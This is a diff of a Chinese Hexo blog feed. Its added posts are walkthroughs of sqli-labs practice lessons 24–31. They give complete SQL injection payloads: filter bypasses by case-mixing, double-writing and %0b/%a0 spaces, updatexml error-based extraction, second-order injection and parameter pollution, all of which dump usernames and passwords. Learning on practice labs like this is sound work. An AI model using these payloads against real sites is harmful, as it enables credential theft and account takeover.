@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2022-01-30T04:13:43.688Z</updated>
+  <updated>2022-02-12T10:54:55.456Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,78 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>lesson27</title>
+    <link href="http://example.com/2022/02/01/lesson27/"/>
+    <id>http://example.com/2022/02/01/lesson27/</id>
+    <published>2022-02-01T05:36:21.000Z</published>
+    <updated>2022-02-12T10:54:55.456Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="lesson27"><a href="#lesson27" class="headerlink" title="lesson27"></a>lesson27</h1><p><img src="https://s2.loli.net/2022/02/11/qPV5SrDFJY23Llb.png" alt="QQ截图20220211160219.png"></p><p>因为没有报错的回显所以我们采用联合查询</p><p>又因为select和union又被过滤，所以我们采用uNion和sElect </p><p>?id=11111’  %0b uNion %0b sElect %0b 1,2,3 ||’1’=’1</p><p><img src="https://s2.loli.net/2022/02/11/d9YUSojrPWRaHmv.png" alt="QQ截图20220211185056.png"></p><p>?id=11111’  %0b uNion %0b sElect %0b 1,database(),3 ||’1’=’1</p><p><img src="https://s2.loli.net/2022/02/11/v5Fg7dP8WMDxslQ.png" alt="QQ截图20220211185216.png"></p><p>?id=11111’  %0b uNion %0b sElect %0b 1,(sElect(group_concat(table_name))from(information_schema.tables)where(table_schema=’security’)),3 ||’1’=’1</p><p><img src="https://s2.loli.net/2022/02/11/rKFUIOTysvoJqBl.png" alt="QQ截图20220211185630.png"></p><p>?id=11111’  %0b uNion %0b sElect %0b 1,(sElect(group_concat(column_name))from(information_schema.columns)where(table_name=’users’)),3 ||’1’=’1</p><p><img src="https://s2.loli.net/2022/02/11/ldb9HrIsU8RKqaB.png" alt="QQ截图20220211185828.png"></p><p>?id=11111’  %0b uNion %0b sElect %0b 1,(sElect(group_concat(concat_ws(0x7e,username,password)))from(security.users)),3 ||’1’=’1</p><p><img src="https://s2.loli.net/2022/02/11/SbZC5cD3FqGHPLW.png" alt="QQ截图20220211190332.png"></p><h1 id="lesson27a"><a href="#lesson27a" class="headerlink" title="lesson27a"></a>lesson27a</h1><p>lesson27a是相同的方法，和lesson27一样</p><p>主要是空格用%a0或者%0b来代替</p><h1 id="lesson-28"><a href="#lesson-28" class="headerlink" title="lesson 28"></a>lesson 28</h1><p>由</p><p><a href="http://sqli-labs/Less-28/?id=1&#39;)||(&#39;1&#39;)=">http://sqli-labs/Less-28/?id=1&#39;)||(&#39;1&#39;)=</a>(‘1</p><p>是（’’）的包裹方式</p><p>我这里采用盲注来做，但是很多师傅的参考都是用联合查询来做的，我的sql-liblesson28抽风了，空格老是被注释了</p><p>?id=0’)||left(database(),2)=’se’;%00</p><p><img src="https://s2.loli.net/2022/02/12/FevtEJ57W81Gx6B.png" alt="QQ截图20220212184908.png"></p><p>盲注爆出库，表，列</p><h1 id="lesson-28a"><a href="#lesson-28a" class="headerlink" title="lesson 28a"></a>lesson 28a</h1><p>同样的payload，lesson28也可以做，所以跳过了</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;lesson27&quot;&gt;&lt;a href=&quot;#lesson27&quot; class=&quot;headerlink&quot; title=&quot;lesson27&quot;&gt;&lt;/a&gt;lesson27&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://s2.loli.net/2022/02/11/qPV5S</summary>
+      
+    
+    
+    
+    <category term="sql注入" scheme="http://example.com/categories/sql%E6%B3%A8%E5%85%A5/"/>
+    
+    
+    <category term="sql注入" scheme="http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>lesson-29</title>
+    <link href="http://example.com/2022/01/31/lesson-29/"/>
+    <id>http://example.com/2022/01/31/lesson-29/</id>
+    <published>2022-01-31T11:57:27.000Z</published>
+    <updated>2022-02-13T08:03:30.567Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="lesson-29"><a href="#lesson-29" class="headerlink" title="lesson 29"></a>lesson 29</h1><h2 id="首先是了解服务器两层架构"><a href="#首先是了解服务器两层架构" class="headerlink" title="首先是了解服务器两层架构"></a>首先是了解服务器两层架构</h2><p>参考<a href="https://www.cnblog.com/lcamry/p/5762961.html">mysql注入天书之服务器</a></p><p>总之就是要再去搭一个jsp的平台来</p><p>同时打开phpstudy和jspstudy</p><p>通过index.jsp访问到index.php生成的页面</p><p>（buuctf里面的lesson29完全没意义，就跟lesson1一样，老坑人了，这里最好自己搭一个）</p><p><img src="https://s2.loli.net/2022/02/13/496ZE8RYbSBfMUC.png" alt="QQ截图20220213145419.png"></p><p>通过修改第一个id发现回显不会发生变化，且注入会被拦截</p><p><img src="https://s2.loli.net/2022/02/13/7Df26N8sAyEFiRe.png" alt="QQ截图20220213150822.png"></p><p>但是修改第二个id则会回显id对应的username和password，且超出数据 会报错</p><p>所以第二个id处可注入</p><p>联合查询，步骤参考lesson 1</p><p>?id=1&amp;id=-1’ union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=’security’–+</p><p><img src="https://s2.loli.net/2022/02/13/9NX1JIVvGoyLdQ8.png" alt="QQ截图20220213151441.png"></p><p>?id=1&amp;id=-1’ union select 1,2,group_concat(column_name)from information_schema.columns where table_name=’users’–+</p><p><img src="https://s2.loli.net/2022/02/13/IBRWVCXS9Z3LEvp.png" alt="QQ截图20220213152239.png"></p><h1 id="lesson-30"><a href="#lesson-30" class="headerlink" title="lesson 30"></a>lesson 30</h1><p>和29差不多，不过是数据的包裹变成了双引号</p><p><img src="https://s2.loli.net/2022/02/13/a4Cupvjb932Dtyl.png" alt="QQ截图20220213154154.png"></p><p>查库</p><p>?id=1&amp;id=-3”union select 1,database(),3–+</p><p>查表</p><p>?id=1&amp;id=-3”union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=’security’–+</p><p>查列</p><p>?id=1&amp;id=-3”union select 1,database(),group_concat(column_name) from information_schema.columns where table_name=’users’–+</p><p>查字段</p><p>?id=1&amp;id=-3”union select 1,database(),group_concat(concat_ws(‘@@’,username,password)) from security.users–+</p><h1 id="lesson-31"><a href="#lesson-31" class="headerlink" title="lesson 31"></a>lesson 31</h1><p>和前面一样</p><p>就是对数据的包裹变成了双引号加括号的形式</p><p>?id=1&amp;id=-3”) union select 1,2,3–+</p><p><img src="https://s2.loli.net/2022/02/13/voqCabJnfQHSrze.png" alt="QQ截图20220213155229.png"></p><p>?id=1&amp;id=-3”) union select 1,database(),group_concat(table_name)from information_schema.tables where table_schema=’security’–+</p><p>?id=1&amp;id=-3”) union select 1,database(),group_concat(column_name)from information_schema.columns where table_name=’users’–+</p><p>?id=1&amp;id=-3”) union select 1,database(),group_concat(concat_ws(0x7e,username,password))from security.users–+</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;lesson-29&quot;&gt;&lt;a href=&quot;#lesson-29&quot; class=&quot;headerlink&quot; title=&quot;lesson 29&quot;&gt;&lt;/a&gt;lesson 29&lt;/h1&gt;&lt;h2 id=&quot;首先是了解服务器两层架构&quot;&gt;&lt;a href=&quot;#首先是了解服务器两层架构&quot;</summary>
+      
+    
+    
+    
+    <category term="sql注入" scheme="http://example.com/categories/sql%E6%B3%A8%E5%85%A5/"/>
+    
+    
+    <category term="sql注入" scheme="http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>less24</title>
+    <link href="http://example.com/2022/01/26/less24/"/>
+    <id>http://example.com/2022/01/26/less24/</id>
+    <published>2022-01-26T03:14:16.000Z</published>
+    <updated>2022-02-11T05:34:17.951Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="lesson-24-second-order-injection-二次注入"><a href="#lesson-24-second-order-injection-二次注入" class="headerlink" title="lesson 24 second order injection(二次注入)"></a>lesson 24 second order injection(二次注入)</h1><p>第一步：插入恶意数据</p><p>  第一次进行数据库插入数据的时候 ，仅仅对其中的特殊符号进行转移，在写入数据库的时候还是保留的原来的数据，但是数据本身包含恶意内容。</p><p>第二步：引用恶意数据</p><p>  在将数据存入数据库后，开发者认为数据是可信的，在下一次需要进行的查询的时候，直接从数据库中提取出恶意的数据，没有进行进一步的审查和处理，就会造成sql的二次注入</p><p><img src="https://s2.loli.net/2022/02/10/3epZOLiJ2jVUSN8.png" alt="QQ截图20220210114019.png"></p><p>一开始有一个普通用户</p><p><img src="https://s2.loli.net/2022/02/10/DsGjFoLQ37cxZrT.png" alt="QQ截图20220210130715.png"></p><p>账号：admin</p><p>密码：admin</p><p>然后我们（黑客）注册一个新的账号</p><p><img src="https://s2.loli.net/2022/02/10/HhZUVG63Bp4JleE.png" alt="QQ截图20220210130845.png"></p><p>账号：admin’#        </p><p>密码：123456</p><p>然后登入修改密码。</p><p><img src="https://s2.loli.net/2022/02/10/x1IZWh4JC7HBVE6.png" alt="QQ截图20220210131006.png"></p><img src="https://s2.loli.net/2022/02/10/jMmFSRH2pQwLWbd.png" alt="QQ截图20220210131200.png" style="zoom:150%;" /><p>然后当我们用admin的帐号登入时，发现密码被恶意修改了</p><p><img src="https://s2.loli.net/2022/02/10/TtXzn9W8HoUGPxe.png" alt="QQ截图20220210131303.png"></p><p>这里就是在我们用admin‘#的账号修改密码时，数据库提取我们的恶意数据没有进行转意使得原本用来修改密码的语句:</p><p>UPDATE users SET PASSWORD=’$pass’ where username=’admin’#’ and password=’&amp;curr_pass’</p><p>变成了</p><p>UPDATA users SET PASSWORD=’$pass’ where username=’admin’</p><p>导致密码被修改。。。。</p><h1 id="lesson25"><a href="#lesson25" class="headerlink" title="lesson25"></a>lesson25</h1><p>黑名单里面 ‘or’ ‘and’被过滤了</p><p><img src="https://s2.loli.net/2022/02/10/vYLRFpD6jd8o291.png" alt="QQ截图20220210131449.png"></p><p>用双写来绕过</p><p>数据库</p><p>?id=-1’ union select 1,database(),3 anandd ‘1’=’1</p><p><img src="https://s2.loli.net/2022/02/10/mRkdLg6e8vZbBDy.png" alt="QQ截图20220210163701.png"></p><p>表</p><p>?id=-1’ union select 1,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema=’security’),3 anandd ‘1’=’1</p><p><img src="https://s2.loli.net/2022/02/10/javtyi4HwoYlEeK.png" alt="QQ截图20220210165641.png"></p><p>列</p><p>?id=-1’ union select 1,(select group_concat(column_name) from infoorrmation_schema.columns where table_name=’users’),3 anandd ‘1’=’1</p><p><img src="https://s2.loli.net/2022/02/10/78Cobgc6xOWniBr.png" alt="QQ截图20220210170055.png"></p><p>字段</p><p>?id=-1’ union select 1,(select group_concat(concat_ws(‘@@’,id,username,passwoorrd))from users),3 anandd ‘1’=’1</p><p><img src="https://s2.loli.net/2022/02/10/ekXN37wJZHVj14q.png" alt="QQ截图20220210171358.png"></p><p>PS:information和password里面都有or要双写。</p><h1 id="lesson-25a"><a href="#lesson-25a" class="headerlink" title="lesson 25a"></a>lesson 25a</h1><p>与上一关相同</p><p>同样的黑名单过滤了or和and</p><p>就是闭合不同。。。</p><h1 id="lesson26"><a href="#lesson26" class="headerlink" title="lesson26"></a>lesson26</h1><p><img src="https://s2.loli.net/2022/02/10/gePrwp1ZIFacDM2.png" alt="QQ截图20220210173023.png"></p><p>查库</p><p>?id=1’||updatexml(1,concat(0x7e,(database())),1)||’1’=’1</p><p><img src="https://s2.loli.net/2022/02/10/XaRNkyO5PG3ovUA.png" alt="QQ截图20220210221443.png"></p><p>查表</p><p>?id=1’||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=’security’))),1)||’1’=’1</p><p><img src="https://s2.loli.net/2022/02/10/tB5bxJQDqmkphzl.png" alt="QQ截图20220210221611.png"></p><p>查列</p><p>?id=1’||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name=’users’))),1)||’1’=’1</p><p><img src="https://s2.loli.net/2022/02/10/dJGyOLD13MxXIVW.png" alt="QQ截图20220210221718.png"></p><p>字段</p><p>?id=1’||updatexml(1,concat(0x7e,(select    (group_concat(concat_ws(0x7e,username,passwoorrd))) from (security.users)  )),1)||’1’=’1</p><p><img src="https://s2.loli.net/2022/02/11/O9I65hUse34rL71.png" alt="QQ截图20220210230328.png"></p><p>%a0也可以充当空格，注释符可以用;%00或者||’1’=’1</p><h1 id="lesson-26a"><a href="#lesson-26a" class="headerlink" title="lesson 26a"></a>lesson 26a</h1><p>黑名单一样只是闭合多了括号</p><p>因为没有报错信息，所以我们只能用联合查询</p><p>黑名单中对空格做了过滤，所以我们可以用%a0来代替空格</p><p>基本与lesson26相同</p><p>?id=1’) %a0 union %a0 select%a0 1,2,3 || (‘1’)=(‘1</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;lesson-24-second-order-injection-二次注入&quot;&gt;&lt;a href=&quot;#lesson-24-second-order-injection-二次注入&quot; class=&quot;headerlink&quot; title=&quot;lesson 24 second o</summary>
+      
+    
+    
+    
+    <category term="sql注入" scheme="http://example.com/categories/sql%E6%B3%A8%E5%85%A5/"/>
+    
+    
+    <category term="sql注入" scheme="http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
   
   <entry>
     <title>hctf2018warmup</title>
@@ -168,7 +240,7 @@
     <link href="http://example.com/2021/11/10/less17/"/>
     <id>http://example.com/2021/11/10/less17/</id>
     <published>2021-11-10T11:51:06.000Z</published>
-    <updated>2022-02-06T08:47:06.240Z</updated>
+    <updated>2022-02-10T12:23:06.882Z</updated>
     
     <content type="html"><![CDATA[<h1 id="less17的注入过滤"><a href="#less17的注入过滤" class="headerlink" title="less17的注入过滤"></a>less17的注入过滤</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$value</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// truncation (see comments)</span></span><br><span class="line"><span class="variable">$value</span> = substr(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line"><span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = stripslashes(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Quote if not a number</span></span><br><span class="line"><span class="keyword">if</span> (!ctype_digit(<span class="variable">$value</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="string">&quot;&#x27;&quot;</span> . mysql_real_escape_string(<span class="variable">$value</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = intval(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>substr（$value，0,15）；首先截取前16个字符</p><p>magic_quotes_gpc()函数在php中作用是判断用户提供数据，如包括有：post，get，cookie过来的数据增加转义字符“\”,以确保这些数据不会引起程序的错误</p><p>ctype_digit()判断是不是纯的数字</p><p> mysql_real_escape_string()调用mysql库的函数 mysql_real_escape_string,在以下字符前添加反斜杠：\x00,\n,\r,,‘,”,和\x1a，默认字符集。</p><p><img src="https://i.loli.net/2021/11/10/AyNRDwTH7zcB5xV.png" alt="QQ浏览器截图20211110212406.png"></p><p>只截取前16个字符，的同时注释（\）单引号</p><p>但是它对密码部分没做注入过滤，所以只要有正确的账号就可以尝试在passwd=后面进行注入</p><h1 id="UPDATEXML-XML-document-XPath-string-new-value-函数"><a href="#UPDATEXML-XML-document-XPath-string-new-value-函数" class="headerlink" title="UPDATEXML (XML_document, XPath_string, new_value)函数"></a>UPDATEXML (XML_document, XPath_string, new_value)函数</h1><p>XML_document是string格式，为XMl文档对象的名称</p><p>XPath_string(Xpath格式的字符串)</p><p>new_value为string格式，替换查找符合条件的数据</p><p>该函数用于改变文档中符合条件的节点的值，意为改变XML_document中符合XPATH_string的值</p><p>利用concat()函数只是将其拼接成字符串格式，来利用UPDATEXML (XML_document, XPath_string, new_value)函数报错出XPath_string的值</p><p>select updatexml(1,concat(0x7e,(database())),1);</p><p>select updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1)),1);</p><p>select updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table.schema=’security’ limit 0,1)),1);</p><h1 id="补充（2022-01-29）：常用floor函数的报错注入"><a href="#补充（2022-01-29）：常用floor函数的报错注入" class="headerlink" title="补充（2022 01 29）：常用floor函数的报错注入"></a>补充（2022 01 29）：常用floor函数的报错注入</h1><p>floor函数：向下取整</p><p>rand函数：随机取数，诺有参数x，则使每一个x对应一个固定的值，如果连续多次执行会变化，但是可以预测。</p><p>floor（rand（0）*2）产生的随机数序列为011011.。。。</p><h2 id="报错注入原理"><a href="#报错注入原理" class="headerlink" title="报错注入原理"></a>报错注入原理</h2><p>利用数据库主键不能重复的原理，使用group by 分组，产生主键重复而导致报错</p><p>详见<a href="https://blog.csdn.net/weixin_45146120/article/details/100062786?utm_source=app&app_version=5.0.1&code=app_1562916241&uLinkId=usr1mkqgl919blen">csdn  dalao</a>的文章</p><p>因为发现好像lesson5，6也可以用报错来注入所以就在这里补充了</p>]]></content>
     
@@ -399,76 +471,6 @@
     
     
     
-    
-  </entry>
-  
-  <entry>
-    <title>“关于HTML”</title>
-    <link href="http://example.com/2021/09/28/%E2%80%9C%E5%85%B3%E4%BA%8EHTML%E2%80%9D/"/>
-    <id>http://example.com/2021/09/28/%E2%80%9C%E5%85%B3%E4%BA%8EHTML%E2%80%9D/</id>
-    <published>2021-09-28T06:23:46.000Z</published>
-    <updated>2021-10-25T15:44:19.030Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="关于b站上的一些教程做的笔记"><a href="#关于b站上的一些教程做的笔记" class="headerlink" title="关于b站上的一些教程做的笔记"></a>关于b站上的一些<a href="https://www.bilibili.com/video/BV1S7411e79V?p=3">教程</a>做的笔记</h1><h2 id="Html-超文本标记语言能加载CSS图片和JS样式"><a href="#Html-超文本标记语言能加载CSS图片和JS样式" class="headerlink" title="Html: 超文本标记语言能加载CSS图片和JS样式"></a>Html: 超文本标记语言能加载CSS图片和JS样式</h2><h2 id="Html元素解读"><a href="#Html元素解读" class="headerlink" title="Html元素解读"></a>Html元素解读</h2><h3 id="HTMl元素"><a href="#HTMl元素" class="headerlink" title="HTMl元素"></a>HTMl元素</h3><pre><code class="&lt;!--">```&lt;img src=””width=””height=””/&gt;: 图像```&lt;a href=&quot;&quot;&gt;: 链接```&lt;form&gt;: 表单```&lt;iframe&gt;: 内联框架</code></pre>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;关于b站上的一些教程做的笔记&quot;&gt;&lt;a href=&quot;#关于b站上的一些教程做的笔记&quot; class=&quot;headerlink&quot; title=&quot;关于b站上的一些教程做的笔记&quot;&gt;&lt;/a&gt;关于b站上的一些&lt;a href=&quot;https://www.bilibili.com/vi</summary>
-      
-    
-    
-    
-    <category term="web常识" scheme="http://example.com/categories/web%E5%B8%B8%E8%AF%86/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>“冷知识”</title>
-    <link href="http://example.com/2021/09/26/%E2%80%9C%E5%86%B7%E7%9F%A5%E8%AF%86%E2%80%9D/"/>
-    <id>http://example.com/2021/09/26/%E2%80%9C%E5%86%B7%E7%9F%A5%E8%AF%86%E2%80%9D/</id>
-    <published>2021-09-26T00:28:04.000Z</published>
-    <updated>2021-10-25T16:19:36.100Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="冷知识"><a href="#冷知识" class="headerlink" title="冷知识"></a>冷知识</h1><h2 id="冷知识1号-robort-txt中藏着不允许和允许探测的文件名"><a href="#冷知识1号-robort-txt中藏着不允许和允许探测的文件名" class="headerlink" title="冷知识1号: robort.txt中藏着不允许和允许探测的文件名"></a>冷知识1号: robort.txt中藏着不允许和允许探测的文件名</h2><h2 id="冷知识2号-ssh使远程计算机通过ss客服端登入本地服务器，实现远程操作"><a href="#冷知识2号-ssh使远程计算机通过ss客服端登入本地服务器，实现远程操作" class="headerlink" title="冷知识2号: ssh使远程计算机通过ss客服端登入本地服务器，实现远程操作"></a>冷知识2号: ssh使远程计算机通过ss客服端登入本地服务器，实现远程操作</h2><h2 id="冷知识3号-crawl-爬行-指顺这内部链接访问网站内页，再顺着导出链接访问其他网站"><a href="#冷知识3号-crawl-爬行-指顺这内部链接访问网站内页，再顺着导出链接访问其他网站" class="headerlink" title="冷知识3号: crawl(爬行)指顺这内部链接访问网站内页，再顺着导出链接访问其他网站"></a>冷知识3号: crawl(爬行)指顺这内部链接访问网站内页，再顺着导出链接访问其他网站</h2><h2 id="冷知识4号-audit-审计-指按照一定安全策略，利用记录、系统活动和用户活动等信息，检查、审查和检验操作事件的环境及活动，从而发现系统漏洞的过程"><a href="#冷知识4号-audit-审计-指按照一定安全策略，利用记录、系统活动和用户活动等信息，检查、审查和检验操作事件的环境及活动，从而发现系统漏洞的过程" class="headerlink" title="冷知识4号: audit(审计)指按照一定安全策略，利用记录、系统活动和用户活动等信息，检查、审查和检验操作事件的环境及活动，从而发现系统漏洞的过程"></a>冷知识4号: audit(审计)指按照一定安全策略，利用记录、系统活动和用户活动等信息，检查、审查和检验操作事件的环境及活动，从而发现系统漏洞的过程</h2><h2 id="HTTP-Referer-告知服务器请求来源（浏览器自动加上）"><a href="#HTTP-Referer-告知服务器请求来源（浏览器自动加上）" class="headerlink" title="HTTP Referer: 告知服务器请求来源（浏览器自动加上）"></a>HTTP Referer: 告知服务器请求来源（浏览器自动加上）</h2><h3 id="302或301状态码表示跳转"><a href="#302或301状态码表示跳转" class="headerlink" title="302或301状态码表示跳转"></a>302或301状态码表示跳转</h3><h3 id="Cookie-服务器颁发的凭证"><a href="#Cookie-服务器颁发的凭证" class="headerlink" title="Cookie: 服务器颁发的凭证"></a>Cookie: 服务器颁发的凭证</h3><h3 id="网页-HTML-JS-CSS"><a href="#网页-HTML-JS-CSS" class="headerlink" title="网页=HTML+JS+CSS"></a>网页=HTML+JS+CSS</h3><h2 id="JS-给网页添加动态效果"><a href="#JS-给网页添加动态效果" class="headerlink" title="JS: 给网页添加动态效果"></a>JS: 给网页添加动态效果</h2><h2 id="CSS-给网页添加样式和图片"><a href="#CSS-给网页添加样式和图片" class="headerlink" title="CSS: 给网页添加样式和图片"></a>CSS: 给网页添加样式和图片</h2><h2 id="Html-超文本标记语言能加载CSS图片和JS样式"><a href="#Html-超文本标记语言能加载CSS图片和JS样式" class="headerlink" title="Html: 超文本标记语言能加载CSS图片和JS样式"></a>Html: 超文本标记语言能加载CSS图片和JS样式</h2><hr>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;冷知识&quot;&gt;&lt;a href=&quot;#冷知识&quot; class=&quot;headerlink&quot; title=&quot;冷知识&quot;&gt;&lt;/a&gt;冷知识&lt;/h1&gt;&lt;h2 id=&quot;冷知识1号-robort-txt中藏着不允许和允许探测的文件名&quot;&gt;&lt;a href=&quot;#冷知识1号-robort-txt中藏</summary>
-      
-    
-    
-    
-    <category term="常识" scheme="http://example.com/categories/%E5%B8%B8%E8%AF%86/"/>
-    
-    
-    <category term="一些不知道有没有用的概念" scheme="http://example.com/tags/%E4%B8%80%E4%BA%9B%E4%B8%8D%E7%9F%A5%E9%81%93%E6%9C%89%E6%B2%A1%E6%9C%89%E7%94%A8%E7%9A%84%E6%A6%82%E5%BF%B5/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>“菜鸟笔记1号”</title>
-    <link href="http://example.com/2021/09/19/%E2%80%9C%E8%8F%9C%E9%B8%9F%E7%AC%94%E8%AE%B01%E5%8F%B7%E2%80%9D/"/>
-    <id>http://example.com/2021/09/19/%E2%80%9C%E8%8F%9C%E9%B8%9F%E7%AC%94%E8%AE%B01%E5%8F%B7%E2%80%9D/</id>
-    <published>2021-09-19T05:24:27.000Z</published>
-    <updated>2021-10-25T15:43:41.658Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="对于一个给定对应IP地址的靶场机器挖掘开放服务信息"><a href="#对于一个给定对应IP地址的靶场机器挖掘开放服务信息" class="headerlink" title="对于一个给定对应IP地址的靶场机器挖掘开放服务信息"></a>对于一个给定对应IP地址的靶场机器挖掘开放服务信息</h2><h3 id="为了得到靶场开放服务和服务版可使用"><a href="#为了得到靶场开放服务和服务版可使用" class="headerlink" title="为了得到靶场开放服务和服务版可使用"></a>为了得到靶场开放服务和服务版可使用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$nmap</span> -sV +IP</span><br></pre></td></tr></table></figure><h3 id="为了得到靶场全部信息"><a href="#为了得到靶场全部信息" class="headerlink" title="为了得到靶场全部信息"></a>为了得到靶场全部信息</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$nmap</span> -A -v+IP</span><br></pre></td></tr></table></figure><h3 id="对开放http的服务用浏览器访问"><a href="#对开放http的服务用浏览器访问" class="headerlink" title="对开放http的服务用浏览器访问"></a>对开放http的服务用浏览器访问</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$nmap</span> -o+IP</span><br></pre></td></tr></table></figure><h3 id="探索该服务的隐藏文件"><a href="#探索该服务的隐藏文件" class="headerlink" title="探索该服务的隐藏文件"></a>探索该服务的隐藏文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$dirb</span> http//***/</span><br></pre></td></tr></table></figure><h3 id="查找具有权限root的文件"><a href="#查找具有权限root的文件" class="headerlink" title="查找具有权限root的文件"></a>查找具有权限root的文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$find</span> / -perm -4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure><hr>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h2 id=&quot;对于一个给定对应IP地址的靶场机器挖掘开放服务信息&quot;&gt;&lt;a href=&quot;#对于一个给定对应IP地址的靶场机器挖掘开放服务信息&quot; class=&quot;headerlink&quot; title=&quot;对于一个给定对应IP地址的靶场机器挖掘开放服务信息&quot;&gt;&lt;/a&gt;对于一个给定对应IP地</summary>
-      
-    
-    
-    
-    <category term="常识" scheme="http://example.com/categories/%E5%B8%B8%E8%AF%86/"/>
-    
-    
-    <category term="非常高兴能在b站上找到这么多的“ctf教程”，感谢那些无偿的“搬运姬们”，现在开始学习啦！" scheme="http://example.com/tags/%E9%9D%9E%E5%B8%B8%E9%AB%98%E5%85%B4%E8%83%BD%E5%9C%A8b%E7%AB%99%E4%B8%8A%E6%89%BE%E5%88%B0%E8%BF%99%E4%B9%88%E5%A4%9A%E7%9A%84%E2%80%9Cctf%E6%95%99%E7%A8%8B%E2%80%9D%EF%BC%8C%E6%84%9F%E8%B0%A2%E9%82%A3%E4%BA%9B%E6%97%A0%E5%81%BF%E7%9A%84%E2%80%9C%E6%90%AC%E8%BF%90%E5%A7%AC%E4%BB%AC%E2%80%9D%EF%BC%8C%E7%8E%B0%E5%9C%A8%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0%E5%95%A6%EF%BC%81/"/>
     
   </entry>
   
